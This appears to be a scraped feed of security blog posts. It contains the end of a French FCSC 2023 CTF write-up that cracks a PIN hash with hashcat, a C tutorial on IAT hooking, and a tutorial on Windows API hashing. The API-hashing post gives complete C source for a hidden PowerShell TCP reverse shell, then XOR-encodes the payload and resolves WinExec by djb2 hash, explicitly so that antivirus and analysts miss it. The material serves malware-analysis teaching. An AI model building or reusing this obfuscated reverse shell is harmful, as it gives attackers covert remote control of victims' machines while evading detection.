0xb3, 0x68, 0x97, 0xe8, 0x6c, 0x17, 0xd7, 0x97, 0x60, 0x1a, 0x3c, 0xda, 0xa6, 0xb8, 0x24, 0xd3, 0xb9, 0xac, 0xe6, 0xec, 0xac, 0xac, 0x55, 0xfd, 0x49, 0xaf, 0x5d, 0xaa, 0x44, 0x4f, 0x8f, 0x3e, 0x7d, 0xf5, 0xf2, 0xa7 ] que je xor par 0x15 afin d\u0026rsquo;obtenir le hash suivant :\nf60b397423a8bdd546e5e150849d1eb2932c20cda6dc6f29dfcac8d7a67d82fd7902c282750f29cfb3ad31c6acb9f3f9b9b940e85cba48bf515a9a2b68e0e7b2 Nous savons que notre code PIN à une taille de 6 caractère et nous avons \u0026ldquo;0123456\u0026rdquo; comme set de caractère. On pourra donc très facilement casser ce mot de passe.\nPour ce faire j\u0026rsquo;ai utilisé hashcat :\n.\\hashcat.exe -m 1700 -a 3 f60b397423a8bdd546e5e150849d1eb2932c20cda6dc6f29dfcac8d7a67d82fd7902c282750f29cfb3ad31c6acb9f3f9b9b940e85cba48bf515a9a2b68e0e7b2 ?d?d?d?d?d?d Et nous obtenons un code pin qui est 413372 !!\nOn peut donc maintenant l\u0026rsquo;essayer dans notre émulateur et obtenir le flag.\nLe flag est donc FCSC413372 !\nConclusion C\u0026rsquo;était la première fois que je reversais un firmware et malgré beaucoup de difficultés au début j\u0026rsquo;ai apprécié ce challenge. Si je devais en retenir quelque chose ce serait prendre le temps de comprendre le firmware afin de configurer correctement son désassembleur. J\u0026rsquo;ai en effet l\u0026rsquo;habitude de reverse des binaires très communs tels que des ELF, PE, etc. qui sont très bien pris en charges par les désassembleurs. Ce fut un challenge très enrichissant, un grand merci aux créateurs.\n","permalink":"https://trikkss.github.io/posts/fcsc2023_Sensor-Watch/","summary":"Write up du challenge Sensor Watch.","title":"FCSC 2023 - Sensor Watch"},{"content":"Import Table When you run a Portable Executable (PE), before the execution of our program, libraries will be loaded in memory and their function addresses will be referenced in the Import Address Table (IAT). When a program calls a function from a DLL, it calls the address located in the IAT wich point to the function in memory.\ndiagram of a normal api call :\ndiagram of an hooked api call :\nWe want to change the address of this API call in the IAT to execute an non intended function. This technique can be useful for reverse engineer to change the result of a function or dump his parameter (for example if you have a runPE you can hook the WriteProcessMemory function and easily dump the PE.) and it can be useful for malware devellopers to hide some malicious code.\nImport table structure You can learn more about the import table here.\nThe import table is a null terminated array a null terminated array of IMAGE_IMPORT_DESCRIPTOR structure.\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; } DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; DWORD FirstThunk; } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; Each dll in the Import Table as an IMAGE_IMPORT_DESCRIPTOR structure which contains information about it like its name, its functions, etc.\nHere we will focus only on interesting things for us.\nDWORD Name : RVA of an ASCII string that contains the name of the module (dll name)\nDWORD OriginalFirstThunk : RVA of the Import Lookup Table (ILT)\nDWORD FirstThunk : RVA of the Import Address Table (IAT)\nRelative Virtual Address (RVA) means Relative to the base address.\nExample : dll_name = PE_Base_Address + IMAGE_IMPORT_DESCRIPTOR.Name\nOriginalFirstThunk and FirstThunk The IAT and ILT are parallel\u0026rsquo;s NULL terminated arrays.\nTheir structure is defined as it :\ntypedef struct _IMAGE_THUNK_DATA { union { uint32_t* Function; // address of imported function uint32_t Ordinal; // ordinal value of function PIMAGE_IMPORT_BY_NAME AddressOfData; // RVA of imported name DWORD ForwarderStringl // RVA to forwarder string } u1; } IMAGE_THUNK_DATA, *PIMAGE_THUNK_DATA; Import Lookup Table The ILT contain names and ordinals for each API call.\nif the first bit of AddressOfData is 1, this DWORD is the ordinal of the function to import.\nElse, the AddressOfData point to a IMAGE_IMPORT_BY_NAME structure which contains the API call name and looks like this :\ntypedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; BYTE Name[1]; /*The BYTE designated at Name of course only marks the beginning of the character array of the imported function name as the name can be larger than one character.*/ } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; Import Address Table The IAT contain virtual address of these API calls.\nParsing the import table Now, we have to parse our PE to find it\u0026rsquo;s Import Table. To do that we will use the winnt.h library in C.\nThe following diagram illustrate the simplified structure of a PE.\nWe first have to retrieve the base address of our PE. To do it we can call the GetModuleHandle() API call.\nGetModuleHandle(NULL)\nNow, like my previous article about API Windows Hashing, we will parse the PE.\nHANDLE PE_base = GetModuleHandle(NULL); IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) PE_base; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)PE_base + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header // RVA of the import table can be found in the optional headers // https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-data-directories-image-only // https://0xrick.github.io/win-internals/pe6/#import-directory-table IMAGE_IMPORT_DESCRIPTOR* import_table = (IMAGE_IMPORT_DESCRIPTOR*)((LPBYTE)PE_base + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); Here we retrieve the address of the first IMAGE_IMPORT_DESCRIPTOR array.\nwe can easily iterate trought the null terminated array using a while loop :\nwhile (import_table-\u0026gt;Name != 0) { // print each dll loaded in the import table printf(\u0026#34;%s\\n\u0026#34;, (char*)((LPBYTE)PE_base + import_table-\u0026gt;Name)); } Now, we want for each DLLs to retrieve their functions name and address. We first have to find our ILT and IAT and iterate throught it.\nIMAGE_THUNK_DATA* lookup_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;OriginalFirstThunk); IMAGE_THUNK_DATA* address_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;FirstThunk); // it will print all function name of the module. while(lookup_table-\u0026gt;u1.AddressOfData != 0) { // check if its an import by ordinal if((lookup_table-\u0026gt;u1.AddressOfData \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // retrieve the struct wich contains the function name IMAGE_IMPORT_BY_NAME* lookup_addr = (IMAGE_IMPORT_BY_NAME*)((LPBYTE)PE_base + lookup_table-\u0026gt;u1.AddressOfData); printf(\u0026#34;%s\\n\u0026#34;, (char*)lookup_addr-\u0026gt;Name); } lookup_table++; address_table++; } Now we can print a function\u0026rsquo;s address from its name, like MessageBoxA as below:\n// we want to print the address of the MessageBoxA API call. if(strcmp(lookup_addr-\u0026gt;Name, \u0026#34;MessageBoxA\u0026#34;) == 0) { printf(\u0026#34;%p\\n\u0026#34;, address_table-\u0026gt;u1.Function); // print the function address } Okay, now we have the address of the API call we want to hook.\nThe complete function to print it looks like this :\nvoid print_address_by_parsing_IAT(HMODULE PE_base, char* function_to_hook) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) PE_base; IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)PE_base + p_DOS_HDR-\u0026gt;e_lfanew ); IMAGE_IMPORT_DESCRIPTOR* import_table = (IMAGE_IMPORT_DESCRIPTOR*)((LPBYTE)PE_base + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // iterate throught the null terminated modules array while (import_table-\u0026gt;Name != 0) { // retrieve ILT and IAT IMAGE_THUNK_DATA* lookup_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;OriginalFirstThunk); IMAGE_THUNK_DATA* address_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;FirstThunk); // iterate throught IAT and ILT while(lookup_table-\u0026gt;u1.AddressOfData != 0) { // check if the function is called by ordinal if((lookup_table-\u0026gt;u1.AddressOfData \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // if it is not retrieve its IMAGE_IMPORT_BY_NAME structure IMAGE_IMPORT_BY_NAME* lookup_addr = (IMAGE_IMPORT_BY_NAME*)((LPBYTE)PE_base + lookup_table-\u0026gt;u1.AddressOfData); // compare the function name with the function name to hook if(strcmp(lookup_addr-\u0026gt;Name, function_to_hook) == 0) { printf(\u0026#34;%p\\n\u0026#34;, address_table-\u0026gt;u1.Function); } } // next element of the IAT and the ILT lookup_table++; address_table++; } // next module import_table++; } } So, this function will just print the API call address. Now we have to change it.\nHooking the API call Lets make a fake MessageBox :\nINT WINAPI fake_messagebox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType){ printf(\u0026#34;I hooked your function :)\\n\u0026#34;); printf(\u0026#34;you wanted to display %s\\n\u0026#34;, lpText); return 0; } Instead of printing the MessageBoxA address in the IAT, we will overwrite it by fake_messagebox address and save the real MessageBox address into an other variable.\naddress_table-\u0026gt;u1.Function = (ULONGLONG)fake_messagebox;\nOur final code look like this.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; typedef int(WINAPI* MESSAGE_BOX_TYPE)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType); MESSAGE_BOX_TYPE MessageBoxSaved; INT WINAPI fake_messagebox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType){ printf(\u0026#34;I hooked your function :)\\n\u0026#34;); printf(\u0026#34;you wanted to display %s\\n\u0026#34;, lpText); return MessageBoxSaved(hWnd, lpText, lpCaption, uType); } void hook_IAT(HMODULE PE_base, char* function_to_hook) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) PE_base; IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)PE_base + p_DOS_HDR-\u0026gt;e_lfanew ); IMAGE_IMPORT_DESCRIPTOR* import_table = (IMAGE_IMPORT_DESCRIPTOR*)((LPBYTE)PE_base + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // iterate throught the null terminated modules array while (import_table-\u0026gt;Name != 0) { // retrieve ILT and IAT IMAGE_THUNK_DATA* lookup_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;OriginalFirstThunk); IMAGE_THUNK_DATA* address_table = (IMAGE_THUNK_DATA*)((LPBYTE)PE_base + import_table-\u0026gt;FirstThunk); // iterate throught IAT and ILT while(lookup_table-\u0026gt;u1.AddressOfData != 0) { // check if the function is called by ordinal if((lookup_table-\u0026gt;u1.AddressOfData \u0026amp; IMAGE_ORDINAL_FLAG) == 0) { // if it is not retrieve its IMAGE_IMPORT_BY_NAME structure IMAGE_IMPORT_BY_NAME* lookup_addr = (IMAGE_IMPORT_BY_NAME*)((LPBYTE)PE_base + lookup_table-\u0026gt;u1.AddressOfData); // compare the function name with the function name to hook if(strcmp(lookup_addr-\u0026gt;Name, function_to_hook) == 0) { // change its address address_table-\u0026gt;u1.Function = (ULONGLONG)fake_messagebox; } } // next element of the IAT and the ILT lookup_table++; address_table++; } // next module import_table++; } } int main(void) { // save MessageBox function MessageBoxSaved = (MESSAGE_BOX_TYPE)GetProcAddress(LoadLibrary(\u0026#34;user32.dll\u0026#34;), \u0026#34;MessageBoxA\u0026#34;); // hook the function hook_IAT(GetModuleHandle(NULL), \u0026#34;MessageBoxA\u0026#34;); MessageBoxA(NULL, \u0026#34;hello world\u0026#34;, \u0026#34;simple message box\u0026#34;, MB_OK); } /* output : I hooked your function :) you wanted to display hello world */ To go further you can hook any function present in the IAT of an other process using DLL injection to execute some code which will patch the import table. It\u0026rsquo;s a bit more difficult but it can be interesting for game hacking or reverse engineering.\nIssue This technic is useful, but it can be bypassed if the program retrieve its API call address from the Export Table using the GetProcAddress() function.\nConclusion This example was basic, but I think with it you can make lot of funny things.\nI hope you enjoyed to read it, have a nice day.\n","permalink":"https://trikkss.github.io/posts/iat_hooking/","summary":"IAT hooking is a technique often used by malware developers, game hackers or reverse engineer to replace a function from the Import Table by another one.","title":"Malware - IAT Hooking"},{"content":"What is Windows API Hashing This technique is often used by malware developers to hide their calls to the windows API. That way the blue team will have more difficulty reversing the malware and it is less flagged by an AV. Our goal is to make a PE without an import table.\nThe Import Table Let\u0026rsquo;s compile a simple C program which will execute a simple reverse shell using WinExec API call. That call creates a new process and executes a system command.\n#include \u0026lt;windows.h\u0026gt; int main(void) { // execute our reverse shell WinExec(\u0026#34;powershell -nop -c \\\u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;127.0.0.1\u0026#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sb2 = $sb + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\\u0026#34;\u0026#34;, SW_HIDE); return 0; } Before the execution of our program, libraries will be loaded in memory and their function addresses will be referenced in the Import Address Table (IAT). When a program calls a function from a DLL, it calls the address located in the IAT wich points to the function in memory.\nIf we look into our import table (I used CFF Explorer to do it) we can see several imported DLLs and our suspicious function (WinExec).\nA first way will to hide our function would be to retrieve its address at runtime using the GetProcAddress() API call.\n#include \u0026lt;windows.h\u0026gt; typedef UINT(WINAPI* winexec)(LPCSTR lpCmdLine, UINT uCmdShow); int main(void) { // get handle of kernel32.dll HMODULE kernel32_dll = GetModuleHandle(\u0026#34;kernel32.dll\u0026#34;); // parse it to find the WinExec function winexec WinExec_imported = (winexec)GetProcAddress(kernel32_dll, \u0026#34;WinExec\u0026#34;); // execute our reverse shell WinExec_imported(\u0026#34;powershell -nop -c \\\u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;127.0.0.1\u0026#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sb2 = $sb + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\\u0026#34;\u0026#34;, SW_HIDE); return 0; } Here we retrieve the handle (the base address) of the kernel32.dll module with the GetModuleHandle() API call. Now we can use the GetProcAddress() API call to parse our DLL and return the function\u0026rsquo;s address.\nIt works, WinExec seems to be absent from our IAT. But until now it\u0026rsquo;s easy to reverse and functions like GetModuleHandle and GetProcAddress can be suspicious \u0026hellip;\nWrite our own GetProcAddress We will write our own GetProcAddress() function and instead of searching for a function name, we will search for a hash. For now this may be strange for you but don\u0026rsquo;t worry you will understand everything. First we need to understand how the export table works.\nThe Export Table An Export Adress Table (EAT) will reference all the exported functions from a dll.\nThis is what the _IMAGE_EXPORT_DIRECTORY (wich represents the export table) structure defined into the winnt.h library looks like.\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals; } IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY; Name : the module name (dll name if you want) NumberOfFunctions : number of functions available in the module NumberOfNames : because some functions do not have names AddressOfFunctions : pointer to an array of address AddressOfNames : pointer to an array list of names AddressOfNameOrdinals : pointer to an array of \u0026ldquo;ordinals\u0026rdquo; (i will explain that.) diagram from Infosec Resources\nEach function has a number associated to it. It is called an ordinal. Each function name is associated to an ordinal but a function may have no name. Functions are often imported by their names but it makes a lot of strcmp so sometimes functions are imported by ordinal. It makes reverse engineering a bit harder and functions import faster.\nSo now, we can make a \u0026ldquo;roadmap\u0026rdquo; in order to create our own GetProcAdress():\nfirst, we must parse our dll to find the export table after we have to browse the name list to find our function name get ordinal associated to this name get address function associated to this ordinal and return it Parse the dll\u0026rsquo;s to do that we will use the winnt.h library in C.\nThe following diagram illustrates the simplified structure of a PE. more about PE format : Malware researcher’s handbook (demystifying PE file) | Infosec Resources\nSo, we have to parse the DOS header first, then the NT header to access the optionnal headers and finally get the Export Address Table (located in the .edata section)\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;winnt.h\u0026gt; void* my_GetProcAddress(HMODULE dll_handle, char* hashed_function_name) { // a dll is a Portable Executable file. IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header // RVA of the export table can be found in the optional headers // https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#optional-header-data-directories-image-only IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); return NULL; } Now we have the address of our export table. Let\u0026rsquo;s parse it following the EAT diagram above.\nPARSE OUR EXPORT TABLE Getting the name, ordinal and address array.\nDWORD numberOfNames = export_table-\u0026gt;NumberOfNames; // size of array name DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfFunctions); // array function DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNames); // array name WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNameOrdinals); // array ordinal let\u0026rsquo;s iterate through the array name to find our function\nfor(size_t i=0; i \u0026lt; numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; if (strcmp(hashed_function_name, name) == 0) { printf(\u0026#34;function %s found into %s !\\n\u0026#34;, name, (char*)dll_handle+export_table-\u0026gt;Name); } } This loop iterates through the name array and compares each function\u0026rsquo;s name to our string. Now we just have to return the function\u0026rsquo;s address, this is the tricky part. We have to find the ordinal attached to this function\u0026rsquo;s name.\n// these 2 arrays are parallel functions_names[i] // -\u0026gt; name (string) functions_ordinal[i] // -\u0026gt; ordinal (integer) // index of the function into the functions_address list // so we just have to do this to get the function functions_address[functions_ordinal[i]] don\u0026rsquo;t forget that these addresses are relative to the base address so we have to add base_address + address\nHere it\u0026rsquo;s the complete code of our function :\nvoid* my_GetProcAddress(HMODULE dll_handle, char* hashed_function_name) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // .edata section DWORD numberOfNames = export_table-\u0026gt;NumberOfNames; printf(\u0026#34;number of names : %d\\n\u0026#34;, numberOfNames); DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfFunctions); DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNames); WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNameOrdinals); for(size_t i=0; i \u0026lt; numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; // printf(\u0026#34;%s\\n\u0026#34;,name); if (strcmp(hashed_function_name, name) == 0) { printf(\u0026#34;function %s found into %s !\\n\u0026#34;, name, (char*)dll_handle+export_table-\u0026gt;Name); return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]]; } } return NULL; } Nice it works. Now we just have to \u0026ldquo;obfuscate\u0026rdquo; the name of our DLLs.\nAfter searching a bit on google I found the djb2 algorithm wich seems fast and interesting.\nunsigned long hash_djb2(unsigned char *str) { unsigned long hash = 5381; int c; while (c = *str++) hash = ((hash \u0026lt;\u0026lt; 5) + hash) + c; /* hash * 33 + c */ return hash; } If we call our hash fonction with \u0026ldquo;WinExec\u0026rdquo; argument we have this output :\nprintf(\u0026#34;%lu\\n\u0026#34;, hash_djb2(\u0026#34;WinExec\u0026#34;)); // output : 698766968 So our final function is :\nvoid* my_GetProcAddress(HMODULE dll_handle, unsigned long hashed_function_name) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // .edata section DWORD numberOfNames = export_table-\u0026gt;NumberOfNames; DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfFunctions); DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNames); WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNameOrdinals); for(size_t i=0; i \u0026lt; numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; // printf(\u0026#34;%s\\n\u0026#34;,name); if (hashed_function_name == hash_djb2(name)) { return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]]; } } return NULL; } and our final reverse shell looks like this :\n#include \u0026lt;windows.h\u0026gt; #include \u0026lt;winnt.h\u0026gt; typedef UINT(WINAPI* winexec)(LPCSTR lpCmdLine, UINT uCmdShow); void* my_GetProcAddress(HMODULE dll_handle, unsigned long hashed_function_name); unsigned long hash_djb2(unsigned char *str); void xor(char* string, unsigned long key); int main(void) { // get handle of kernel32.dll unsigned long hash_function_name = 698766968; // char payload[] = \u0026#34;powershell -nop -c \\\u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;127.0.0.1\u0026#39;,4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sb2 = $sb + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\\\u0026#34;\u0026#34;; char payload[] = \u0026#34;\\x09\\x18\\x10\\x1e\\x0b\\x0c\\x11\\x1e\\x15\\x15\\x59\\x56\\x17\\x18\\x09\\x59\\x56\\x1c\\x59\\x5b\\x5d\\x1c\\x15\\x12\\x1e\\x17\\x0d\\x59\\x46\\x59\\x37\\x1e\\x10\\x56\\x38\\x1b\\x13\\x1e\\x1c\\x0d\\x59\\x2c\\x02\\x0c\\x0d\\x1e\\x16\\x57\\x37\\x1e\\x0d\\x57\\x2c\\x18\\x1c\\x14\\x1e\\x0d\\x0c\\x57\\x2d\\x3c\\x29\\x3c\\x15\\x12\\x1e\\x17\\x0d\\x51\\x60\\x4a\\x4b\\x50\\x57\\x49\\x57\\x49\\x57\\x4a\\x60\\x55\\x4d\\x4d\\x4d\\x4d\\x52\\x44\\x5d\\x0c\\x59\\x46\\x59\\x5d\\x1c\\x15\\x12\\x1e\\x17\\x0d\\x57\\x40\\x1e\\x0d\\x2c\\x0d\\x0b\\x1e\\x1a\\x16\\x51\\x52\\x44\\x24\\x1b\\x02\\x0d\\x1e\\x24\\x26\\x26\\x5d\\x1b\\x59\\x46\\x59\\x49\\x57\\x57\\x4f\\x4e\\x4e\\x4c\\x4e\\x05\\x5e\\x04\\x49\\x06\\x44\\x10\\x11\\x12\\x15\\x1e\\x51\\x51\\x5d\\x12\\x59\\x46\\x59\\x5d\\x0c\\x57\\x2b\\x1e\\x1a\\x1d\\x51\\x5d\\x1b\\x55\\x59\\x49\\x55\\x59\\x5d\\x1b\\x57\\x35\\x1e\\x17\\x20\\x0d\\x11\\x52\\x52\\x59\\x56\\x17\\x1e\\x59\\x49\\x52\\x04\\x44\\x5d\\x1d\\x1a\\x0d\\x1a\\x59\\x46\\x59\\x51\\x37\\x1e\\x10\\x56\\x38\\x1b\\x13\\x1e\\x1c\\x0d\\x59\\x56\\x2d\\x02\\x09\\x1e\\x37\\x1a\\x16\\x1e\\x59\\x2c\\x02\\x0c\\x0d\\x1e\\x16\\x57\\x2d\\x1e\\x01\\x0d\\x57\\x3a\\x2c\\x3c\\x32\\x32\\x3e\\x17\\x1c\\x18\\x1d\\x12\\x17\\x20\\x52\\x57\\x40\\x1e\\x0d\\x2c\\x0d\\x0b\\x12\\x17\\x20\\x51\\x5d\\x1b\\x55\\x49\\x55\\x59\\x5d\\x12\\x52\\x44\\x5d\\x0c\\x1b\\x59\\x46\\x59\\x51\\x12\\x1e\\x01\\x59\\x5d\\x1d\\x1a\\x0d\\x1a\\x59\\x4b\\x47\\x5f\\x4a\\x59\\x05\\x59\\x38\\x0e\\x0d\\x56\\x2c\\x0d\\x0b\\x12\\x17\\x20\\x59\\x52\\x44\\x5d\\x0c\\x1b\\x4b\\x59\\x46\\x59\\x5d\\x0c\\x1b\\x59\\x54\\x59\\x60\\x29\\x2c\\x59\\x60\\x59\\x54\\x59\\x51\\x09\\x10\\x1d\\x52\\x57\\x29\\x1a\\x0d\\x11\\x59\\x54\\x59\\x60\\x47\\x59\\x60\\x44\\x5d\\x0c\\x1b\\x0d\\x59\\x46\\x59\\x51\\x24\\x0d\\x1e\\x01\\x0d\\x57\\x1e\\x17\\x1c\\x18\\x1d\\x12\\x17\\x20\\x26\\x43\\x43\\x3a\\x2c\\x3c\\x32\\x32\\x52\\x57\\x40\\x1e\\x0d\\x3b\\x02\\x0d\\x1e\\x0c\\x51\\x5d\\x0c\\x1b\\x4b\\x52\\x44\\x5d\\x0c\\x57\\x30\\x0b\\x12\\x0d\\x1e\\x51\\x5d\\x0c\\x1b\\x0d\\x55\\x49\\x55\\x5d\\x0c\\x1b\\x0d\\x57\\x35\\x1e\\x17\\x20\\x0d\\x11\\x52\\x44\\x5d\\x0c\\x57\\x3f\\x15\\x0e\\x0c\\x11\\x51\\x52\\x06\\x44\\x5d\\x1c\\x15\\x12\\x1e\\x17\\x0d\\x57\\x3c\\x15\\x18\\x0c\\x1e\\x51\\x52\\x5b\u0026#34;; xor(payload, hash_function_name); HMODULE kernel32_dll = LoadLibrary(\u0026#34;kernel32.dll\u0026#34;); // parse it to find the WinExec function //winexec WinExec_imported = (winexec)GetProcAddress(kernel32_dll, \u0026#34;WinExec\u0026#34;); winexec WinExec_imported = (winexec)my_GetProcAddress(kernel32_dll, 698766968); WinExec_imported(payload, SW_HIDE); return 0; } void xor(char* string, unsigned long key) { while (*string) { *string -= 1; *string++ ^= (char)(key \u0026amp; 0xff); } } void* my_GetProcAddress(HMODULE dll_handle, unsigned long hashed_function_name) { IMAGE_DOS_HEADER* p_DOS_HDR = (IMAGE_DOS_HEADER*) dll_handle; // convert your data into an IMAGE_DOS_HEADER* type defined in winnt.h IMAGE_NT_HEADERS* p_NT_HDR = (IMAGE_NT_HEADERS*) ((LPBYTE)dll_handle + p_DOS_HDR-\u0026gt;e_lfanew ); // NT HEADERS are located at the raw offset defined in the e_lfanew header IMAGE_EXPORT_DIRECTORY* export_table = (IMAGE_EXPORT_DIRECTORY*)((LPBYTE)dll_handle + p_NT_HDR-\u0026gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); // .edata section DWORD numberOfNames = export_table-\u0026gt;NumberOfNames; DWORD* functions_address = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfFunctions); DWORD* functions_names = (DWORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNames); WORD* functions_ordinal = (WORD*)((LPBYTE)dll_handle + export_table-\u0026gt;AddressOfNameOrdinals); for(size_t i=0; i \u0026lt; numberOfNames; i++) { char *name = (char*)dll_handle + functions_names[i]; // printf(\u0026#34;%s\\n\u0026#34;,name); if (hashed_function_name == hash_djb2(name)) { return (LPBYTE)dll_handle + functions_address[functions_ordinal[i]]; } } return NULL; } unsigned long hash_djb2(unsigned char *str) { unsigned long hash = 5381; int c; while (c = *str++) hash = ((hash \u0026lt;\u0026lt; 5) + hash) + c; /* hash * 33 + c */ return hash; } i changed my mind, instead of using GetModuleHandle() which just returns the base address only if a module is loaded in memory I used LoadLibrary() wich will load the library if it is not loaded and also return its handle.\nwe compile it :\ngcc reverse-shell.c -s -o 